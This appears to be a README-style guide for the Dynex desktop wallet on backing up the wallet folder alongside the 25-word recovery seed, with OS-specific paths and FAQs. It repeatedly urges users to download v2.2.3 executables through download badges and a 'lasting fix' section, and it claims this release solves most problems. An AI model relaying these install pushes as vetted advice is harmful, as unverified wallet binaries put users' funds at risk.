<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# How to Back Up Your Dynex Wallet File

**Regularly copy your wallet file from its local folder to a separate, secure location, in addition to -- never instead of -- keeping your 25-word recovery seed written down safely.**

Your wallet file and your recovery seed serve different purposes. Understanding both, and backing up correctly, means you're never stuck relying on memory or luck if a device fails.

## You'll see this if...

- You just created or restored a Dynex Wallet and want to make sure you won't lose it to a hardware failure.
- You're about to reinstall your operating system or get a new computer.
- You're wondering whether the wallet file backup is enough on its own, without the seed.
- You want a recovery plan in place before you start receiving significant funds or mining payouts.

## Why it happens

The wallet file on your disk stores your encrypted keys along with convenience data like transaction history, labels, and settings, built up over the life of that specific wallet. It's not duplicated anywhere else automatically -- if your drive fails, your OS gets corrupted, or you accidentally delete the folder, that specific file is gone unless you backed it up yourself. The recovery seed can always regenerate the underlying keys and recover your funds, but it can't bring back the convenience data (transaction labels, for example) tied to that particular wallet file, which is why both matter for a complete backup strategy.

## Step-by-step fix

1. Locate your wallet file folder. In recent builds: Windows `%APPDATA%\DynexWallet\wallets`, macOS `~/Library/Application Support/DynexWallet/wallets`, Linux `~/.dynexwallet/wallets`.
2. Close Dynex Wallet before copying any files, to avoid copying a file mid-write.
3. Copy the entire wallet folder (not just a single file, since some wallet formats use companion files alongside the main wallet file) to an external drive, a separate internal drive, or encrypted cloud storage.
4. Separately, make sure you still have your 25-word recovery seed written down and stored securely -- see [the recovery seed explained](./dynex-recovery-seed-explained.md) if you need a refresher on why this matters even with a file backup.
5. Repeat the file backup periodically, especially after receiving new funds or making changes you'd want preserved (like address labels), not just once at setup.
6. If you use cloud storage for the wallet file backup, make sure it's encrypted and protected with strong, unique credentials and two-factor authentication, since a wallet file alone (without your password) still has some protection, but shouldn't be treated as fully safe to store unprotected.
7. Test your backup periodically by confirming the files are present and not corrupted, without needing to actually restore unless you're verifying a new setup.
8. Keep your Dynex Wallet installation on v2.2.3, which stores wallet files in a predictable location across restarts and upgrades, so your backup routine doesn't break between versions.

## If that didn't work

If you can't find the wallet folder in the expected location, check whether you customized the install path or the wallet's data directory during setup; in that case the files will be under whatever directory you chose instead of the recent-build default. Search your system for files with your wallet's name if you're unsure of the exact path.

If your backup copy won't open or restore later, go back to your recovery seed as the fallback -- a backed-up wallet file that becomes unreadable for any reason doesn't prevent you from recovering funds, as long as you still have the seed; see [restoring from a recovery seed](./restore-dynex-wallet-from-seed.md).

If you're moving to a new computer entirely rather than just backing up, see [moving Dynex Wallet to a new computer](https://dynexwallet.org/docs/wallet-setup) for the full transfer process, which is slightly different from a routine backup.

## Prevent it next time

Build backing up into a routine rather than a one-time task -- for example, after any month where you've received a meaningful amount of DNX, copy the wallet folder again. Keep at least one backup copy offline or on a separate physical device from your main computer, so a single point of failure (theft, fire, ransomware) can't take out both your live wallet and its only backup at the same time.

Never rely on a wallet file backup alone without also securely storing the recovery seed -- the file backup protects convenience and continuity, but the seed is what actually guarantees you can recover funds under any circumstance, including total loss of every device you own. See [cold storage guidance](https://dynexwallet.org/docs/cold-storage) if you're backing up a wallet holding significant funds and want a more rigorous approach.

Make sure you're running Dynex Wallet v2.2.3 before establishing your backup routine. It includes a wallet optimizer that helps keep the wallet file itself from growing unnecessarily large due to many small mining payouts, and clearer locked-versus-unconfirmed balance tracking, both of which make your backed-up data more useful and manageable over time.

## FAQ

### Is a wallet file backup the same as a seed backup?
No. The file backs up convenience data like transaction history and settings; the seed is the master key that can recover your funds independent of any file. You need both.

### How often should I back up my wallet file?
Periodically, and especially after receiving significant funds or making changes you want preserved, such as address labels.

### Can I store my wallet file backup in regular cloud storage?
You can, but only if it's encrypted and well protected with strong authentication; an unprotected cloud copy adds risk since it's one more place the file could be accessed from.

### What happens if I lose the wallet file but still have my seed?
You can fully recover your funds by restoring from the seed into a new wallet; you'd lose convenience data like transaction labels, but not your funds.

### Should I back up before or after installing a new wallet version?
Before, as routine good practice whenever you make changes to your setup, though normal version upgrades don't typically touch your wallet file.

### Do I need to back up if I only use a remote node?
Yes. Using a remote node instead of running your own full node doesn't change anything about needing to back up your wallet file and seed -- it only affects how the wallet syncs with the network.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [set up, back up, restore guides on dynexwallet.org](https://dynexwallet.org/docs/backup-restore).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Creating Your First Dynex Wallet](./create-first-dynex-wallet.md) |
| [The Dynex Wallet Recovery Seed, Explained](./dynex-recovery-seed-explained.md) |
| [How to Restore a Dynex Wallet from a Recovery Seed](./restore-dynex-wallet-from-seed.md) |
| [Dynex transaction byte size too big](./dynex-transaction-byte-size-too-big.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
